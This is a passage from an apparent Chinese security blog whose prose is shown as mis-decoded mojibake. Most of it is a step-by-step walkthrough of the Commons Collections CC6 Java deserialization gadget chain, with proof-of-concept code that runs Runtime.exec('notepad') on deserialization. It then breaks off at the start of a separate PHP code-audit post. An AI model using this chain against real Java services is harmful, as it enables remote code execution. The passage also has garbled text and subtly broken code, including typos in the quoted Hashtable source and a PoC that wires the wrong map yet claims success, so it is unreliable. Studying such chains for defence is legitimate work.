<p>æŠŠè¿™å‡ ä¸ªtransformerç»„åˆèµ·æ¥æ„é€ ä¸€ä¸ªæ‰§è¡Œé“¾ï¼Œä»£ç å¦‚ä¸‹,è¿™æ˜¯ç›´æ¥æˆªå–çš„CC6é“¾çš„éƒ¨åˆ†ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œä»£ç ï¼Œåˆ©ç”¨æˆåŠŸï¼ŒæˆåŠŸå¼¹å‡ºè®°äº‹æœ¬</p>
<p><img src="https://static.sechelper.com/img/2022/11/30/57872890ea984240bce96a69a9a0217a.png" alt="image-20221130102839739"></p>
<p>è¿™é‡Œåªæ˜¯æ‰‹åŠ¨è§¦å‘ï¼Œç°åœ¨è¦çœ‹ä¸€ä¸‹è¢«åŠ¨è§¦å‘ï¼Œä¹Ÿå°±æ˜¯åœ¨çœŸå®çš„åº”ç”¨ä¸­æ€ä¹ˆè§¦å‘ChainedTransformerçš„transformæ–¹æ³•ã€‚</p>
<p>å…¨å±€å¯»æ‰¾å“ªä¸ªç±»ä¸­ä½¿ç”¨äº†factoryæ–¹æ³•ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼Œé”å®šåˆ°äº†LazyMapç±»</p>
<h3 id="LazyMapåˆ©ç”¨é“¾"><a class="header-anchor" href="#LazyMapåˆ©ç”¨é“¾">Â¶</a>LazyMapåˆ©ç”¨é“¾</h3>
<p>LazyMapç±»ä¸­è°ƒç”¨äº†transformçš„åœ°æ–¹ï¼Œåœ¨getæ–¹æ³•ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨äº†this.factory.transformæ–¹æ³•ï¼Œè€Œ   <code>this.factory</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ„é€ åˆ©ç”¨é“¾æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦ä»¤factoryä¸ºæˆ‘ä»¬æ„é€ çš„ChainedTransformerå°±å¯ä»¥è§¦å‘ChainedTransformerçš„transformæ–¹æ³•ã€‚</p>
<p>ç°åœ¨å€’æ˜¯æ‰¾åˆ°äº†èƒ½å¤Ÿè§¦å‘transform()çš„åœ°æ–¹äº†ï¼Œä½†æ˜¯è¿™è¿˜æ˜¯ä¸èƒ½åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è§¦å‘ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ååºåˆ—åŒ–åªä¼šè‡ªåŠ¨è§¦å‘å‡½æ•°readObject(),æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»é‡å†™äº†readObject(),å¹¶ä¸”readObjectä¸­ç›´æ¥æˆ–è€…é—´æ¥çš„è°ƒç”¨äº†åˆšåˆšæ‰¾åˆ°çš„getæ–¹æ³•</p>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œæ­£å¸¸çš„ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œä¼šé‡‡å–ä¸¤ç§ç­–ç•¥ï¼Œä¸€ç§æ˜¯ç»§ç»­å‘ä¸Šå›æº¯ï¼Œæ‰¾getæ–¹æ³•è¢«è°ƒç”¨çš„ä½ç½®ï¼Œå¦ä¸€ç§ç­–ç•¥å°±æ˜¯å…¨å±€æœç´¢readObject()æ–¹æ³•ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å“ªä¸ªç±»ç›´æ¥å°±è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•æˆ–è€…readObjectä¸­æœ‰å¯ç–‘çš„æ“ä½œï¼Œæœ€åèƒ½å¤Ÿé—´æ¥è§¦å‘è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>å¯»æ‰¾åˆ°äº†TiedMapEntryç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­getValueæ–¹æ³•ä¹Ÿè°ƒç”¨äº†getæ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€Œä¸”<code>this.map</code>æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œæ„é€ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­hashCode()å’ŒtoString()æ–¹æ³•é—´æ¥æ‰§è¡Œäº†getValueæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªä¹Ÿæ²¡åŠæ³•ç›´æ¥è§¦å‘ï¼Œå› ä¸ºå®ƒæ²¡æœ‰åœ¨readObjectçš„æ—¶å€™è°ƒç”¨ï¼Œå½“åœ¨readObjectçš„æ—¶å€™è°ƒç”¨ï¼Œæ‰èƒ½è®©å®ƒè‡ªåŠ¨æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆè¦æ‰¾çš„è¿˜æ˜¯readObjectæ–¹æ³•ä¸­çš„è§¦å‘ç‚¹ï¼Œå¯ä»¥å…³æ³¨è¿™ä¸‰ä¸ªæ–¹æ³•è°èƒ½è°ƒç”¨</p>
<p>åœ¨Hashtableä¸­çš„readObjectå­˜åœ¨hashCode()æ–¹æ³•ï¼Œè¿™æ˜¯jdkå†…éƒ¨çš„ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hashtable</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">Dictionary</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;,Cloneable,java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Entry&lt;?,?&gt;[]table;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> threshold;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> loadFactor;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">int</span> <span class="variable">modCount</span> <span class="operator">=</span> o;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1421746759512286392L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.0bjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="comment">//Read in the threshold and loadFactor</span></span><br><span class="line">    s.defaultReadobject();</span><br><span class="line">    <span class="comment">//Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject()</span><br><span class="line">		<span class="type">v</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[]tab, K key, v value)</span> <span class="keyword">throws</span> StreamCorruptedException&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;                        </span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">	<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span>(hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">	<span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index]; e!= <span class="literal">null</span> ; e= e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span>((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<p>æŠŠHashtableå½¢æˆçš„å¯¹è±¡åºåˆ—åŒ–è¿›å»ï¼Œé‚£ä¹ˆå½“åœ¨ååºåˆ—åŒ–æ—¶ï¼Œè¦å»è°ƒç”¨Hashtableçš„readObjectï¼Œå†é—´æ¥å»è°ƒç”¨hashCode()é‡Œçš„getValue()å†å»è°ƒç”¨LazyMapä¸­çš„transform()æ–¹æ³•,è€Œtransform()æ–¹æ³•é‡Œæ˜¯æˆ‘ä»¬æ„é€ çš„ChainedTransformer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        disableWarning();</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(innerMap, transformerChain);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;dd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> hashtable.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] hasharray = (Object[]) table.get(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object obj: hasharray)&#123;</span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">entykey</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">                entykey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                entykey.set(obj,entry);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC6.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;CC6.ser&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸå¼¹å‡ºè®°äº‹æœ¬</p>
<p><img src="https://static.sechelper.com/img/2022/11/30/b34a2b07c66d2e11c1a01deaa730237b.png" alt="image-20221130152623009"></p>
<p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–å¯ä»¥åˆ©ç”¨çš„ç±»å’Œåˆ©ç”¨é“¾ï¼š</p>
<p>BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•</p>
<p>â€‹		toStringæ–¹æ³•ä¸phpä¸­çš„<code>__toString</code>æ–¹æ³•ç±»ä¼¼ï¼Œåœ¨è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥æˆ–è€…æ‰‹åŠ¨æŠŠæŸä¸ªç±»è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™ä¼šè¢«è°ƒç”¨</p>
<p>AnnotationInvocationHandlerçš„invokeæ–¹æ³•ä¸­æœ‰getçš„è°ƒç”¨å†é…åˆåŠ¨æ€ä»£ç†</p>
<p><strong>TransformedMap</strong>åˆ©ç”¨é“¾ï¼Œå¦ä¸€æ¡POPé“¾</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/code-review/php-code-review/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/code-review/php-code-review/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a target="_blank" rel="noopener" href="http://php.net">php.net</a><br>
<img src="https://static.sechelper.com/img/2022/11/22/4c5b04593d276630d656b309748c2635.png" alt="image.png"><br>
phpå®˜æ–¹æ–‡æ¡£æ˜¯éå¸¸è¯¦æƒ…ï¼Œå¥½ç”¨çš„ï¼Œåœ¨é‡åˆ°ä¸æ¸…æ¥šä½œç”¨çš„å‡½æ•°æ—¶å¯ä»¥è¿›è¡ŒæŸ¥è¯¢</p>
<p>ç™½ç›’æµ‹è¯•åšä»£ç å®¡è®¡æœ€ä¸»è¦çš„çŸ¥è¯†æ˜¯è¦å»äº†è§£ä¸€ä¸ªæ¼æ´åº”è¯¥æœ‰å“ªäº›é˜²å¾¡æ–¹å¼ï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„æ¼æ´éƒ½æ˜¯å› ä¸ºä¿®å¤æ²¡æœ‰åšçš„å…¨é¢ï¼Œæˆ–è€…ä¿®å¤æ²¡æœ‰è€ƒè™‘åˆ°ä¸€äº›æƒ…å†µå¯¼è‡´æ¼æ´ã€‚<br>
MVCï¼š<br>
Cï¼šåˆ†å‘å¤„ç†è¯·æ±‚ç½‘ç«™çš„é€»è¾‘<br>
Mï¼šå¤„ç†å’Œæ•°æ®åº“ç›¸å…³çš„æ“ä½œ<br>
Vï¼šæ˜¾ç¤ºç»™ç”¨æˆ·çš„å†…å®¹</p>
<h2 id="ä»£ç å®¡è®¡æµç¨‹"><a class="header-anchor" href="#ä»£ç å®¡è®¡æµç¨‹">Â¶</a>ä»£ç å®¡è®¡æµç¨‹</h2>
<h3 id="æ­£å‘æŸ¥æ‰¾æµç¨‹"><a class="header-anchor" href="#æ­£å‘æŸ¥æ‰¾æµç¨‹">Â¶</a>æ­£å‘æŸ¥æ‰¾æµç¨‹</h3>
<p>a. ä»å…¥å£ç‚¹å‡½æ•°å‡ºå‘ï¼ˆå¦‚index.phpï¼‰<br>
b. æ‰¾åˆ°æ§åˆ¶å™¨ï¼Œç†è§£URLæ´¾å‘è§„åˆ™ï¼ˆURLå…·ä½“æ˜ å°„åˆ°å“ªä¸ªå…·ä½“çš„ä»£ç é‡Œï¼‰<br>
c. è·Ÿè¸ªæ§åˆ¶å™¨è°ƒç”¨ï¼Œä»¥ç†è§£ä»£ç ä¸ºç›®æ ‡è¿›è¡Œæºä»£ç é˜…è¯»<br>
d. æœ€ç»ˆåœ¨é˜…è¯»ä»£ç çš„è¿‡ç¨‹å’Œå°è¯•ä¸­ï¼Œå¯èƒ½å‘ç°æ¼æ´</p>
<p>æœ¬è´¨ï¼šç¨‹åºå‘˜ç–å¿½æˆ–é€»è¾‘é—®é¢˜å¯¼è‡´æ¼æ´</p>
<p>ç‰¹ç‚¹ï¼š</p>
<ol>
<li>å¤æ‚ï¼šéœ€è¦æå…¶äº†è§£ç›®æ ‡æºç çš„åŠŸèƒ½ä¸æ¡†æ¶</li>
<li>è·³è·ƒæ€§å¤§ï¼šæ¶‰åŠM/V/C/Service/Daoç­‰å¤šä¸ªå±‚é¢</li>
<li>æ¼æ´çš„ç»„åˆï¼šé€šå¸¸æ˜¯å¤šä¸ªæ¼æ´çš„ç»„åˆï¼Œå¾ˆå¯èƒ½å­˜åœ¨é€»è¾‘ç›¸å…³çš„æ¼æ´</li>
</ol>
<h3 id="åå‘æŸ¥æ‰¾æµç¨‹"><a class="header-anchor" href="#åå‘æŸ¥æ‰¾æµç¨‹">Â¶</a>åå‘æŸ¥æ‰¾æµç¨‹</h3>
<p>a. é€šè¿‡å±é™©å‡½æ•°ï¼Œå›æº¯å¯èƒ½å­˜åœ¨çš„æ¼æ´<br>
1. æŸ¥æ‰¾å¯æ§å˜é‡<br>
